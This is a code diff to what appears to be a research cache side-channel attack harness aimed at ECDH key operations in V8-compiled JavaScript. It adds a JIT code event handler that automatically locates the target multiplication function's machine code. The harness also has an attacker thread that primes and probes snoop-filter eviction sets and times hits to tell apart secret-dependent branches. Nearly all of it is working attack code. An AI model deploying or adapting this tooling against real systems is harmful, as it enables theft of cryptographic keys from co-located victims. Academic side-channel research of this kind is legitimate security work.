@@ -20,7 +20,7 @@ extern "C" {
 
 static const char *test_name = "v8_ecdh_key_pool";
 static char dump_dir[256];
-uintptr_t jit_func, jit_machine_code;
+uintptr_t jit_machine_code;
 uint64_t ecdh_false_branch_offset = 0x1a6a, ecdh_true_branch_offset = 0x1b7a;
 static const int max_exec_cycles = (int)1e8;
 enum { cache_line_count = 3, profile_iterations = 1 << 16 };
@@ -83,6 +83,8 @@ void *v8_attacker_thread(void *param) {
 			    evset, sf_chain, array_repeat, l2_repeat);
 
 			if (slot == 0) {
+				memset(probe_time_arr, 0, sizeof(probe_time_arr));
+				memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
 				pthread_barrier_wait(sync_ctx.barrier);
 			}
 			pthread_barrier_wait(&attacker_local_barrier);
@@ -105,7 +107,8 @@ void *v8_attacker_thread(void *param) {
 					prime_skx_sf_evset_ps_flush(
 					    evset, sf_chain, array_repeat, l2_repeat);
 				}
-			} while (tsc1 - tsc0 < max_exec_cycles && index < profile_iterations);
+			} while (tsc1 - tsc0 < max_exec_cycles &&
+			         index < profile_iterations);
 
 			log_info("Key %d slot %d find %d hits", i, slot, index);
 			if (slot == 0) {
@@ -143,6 +146,30 @@ int v8_run(int argc, char *argv[]) {
 	    v8::ArrayBuffer::Allocator::NewDefaultAllocator();
 	v8::Isolate *isolate = v8::Isolate::New(create_params);
 	{
+		isolate->SetJitCodeEventHandler(
+		    v8::kJitCodeEventDefault, [](const v8::JitCodeEvent *event) {
+			    if (event->type != v8::JitCodeEvent::CODE_ADDED)
+				    return;
+			    if (event->code_type != v8::JitCodeEvent::JIT_CODE)
+				    return;
+			    if (event->script.IsEmpty())
+				    return;
+			    log_info("JIT event %.*s: code_start=%p len=%zu",
+			             event->name.len,
+			             event->name.str,
+			             event->code_start,
+			             event->code_len);
+			    const char target[] = "JS:*mul :6643:37";
+			    if (event->name.len == sizeof(target) - 1 &&
+			        memcmp(event->name.str, target, event->name.len) == 0) {
+				    jit_machine_code =
+				        reinterpret_cast<uintptr_t>(event->code_start);
+				    log_info(LOG_BOLD_ON
+				             "Set target address to %p" LOG_BOLD_OFF,
+				             jit_machine_code);
+			    }
+		    });
+
 		v8::Isolate::Scope iscope(isolate);
 
 		// Create a stack-allocated handle scope.
@@ -218,34 +245,6 @@ int v8_run(int argc, char *argv[]) {
 
 				log_info("\n\n");
 
-				log_info("Provide jit function address:");
-				if (scanf("%lx", &jit_func) == 1) {
-					log_info("Read jit function address %p", jit_func);
-				} else {
-					log_error("Error reading jit_func\n");
-					exit(1);
-				}
-
-				_Z25_v8_internal_Print_ObjectPv((void *)jit_func);
-
-				if (scanf("%lx", &jit_func) == 1) {
-					log_info("Read jit core address %p", jit_func);
-				} else {
-					log_error("Error reading jit_func\n");
-					exit(1);
-				}
-
-				_Z25_v8_internal_Print_ObjectPv((void *)jit_func);
-
-				log_info("Provide jit machine code address:");
-				if (scanf("%lx", &jit_machine_code) == 1) {
-					log_info("Read jit machine code address %p",
-					         jit_machine_code);
-				} else {
-					log_error("Error reading jit_machine_code\n");
-					exit(1);
-				}
-
 				if (cache_env_init(1)) {
 					_error("Failed to initialize cache env!\n");
 					return 0;
@@ -262,8 +261,7 @@ int v8_run(int argc, char *argv[]) {
 					log_info("cl%d : %p", i, target_addr[i]);
 					evsets[i] = NULL;
 					for (int r = 0; r < retry && evsets[i] == NULL; ++r) {
-						evsets[i] =
-						    prepare_evset((u8 *)target_addr[i], &hctrl);
+						evsets[i] = prepare_evset((u8 *)target_addr[i], &hctrl);
 					}
 					if (evsets[i] == NULL) {
 						log_error("failed to build evset");
@@ -317,8 +315,8 @@ int v8_run(int argc, char *argv[]) {
 					    v8::Script::Compile(context, set_keypair_src)
 					        .ToLocalChecked();
 
-					v8::MaybeLocal<v8::Value> maybe_result =
-					    set_keypair_script->Run(context);
+					v8::MaybeLocal<v8::Value> maybe_result;
+					maybe_result = set_keypair_script->Run(context);
 					v8::Local<v8::Value> result;
 					if (!maybe_result.ToLocal(&result)) {
 						v8::String::Utf8Value error(isolate,
@@ -338,6 +336,7 @@ int v8_run(int argc, char *argv[]) {
 							          *error ? *error : "unknown error");
 						}
 					}
+
 					for (int j = 0; j < victim_runs; ++j) {
 						pthread_barrier_wait(sync_ctx.barrier);
 						maybe_result = repeat_func->Call(
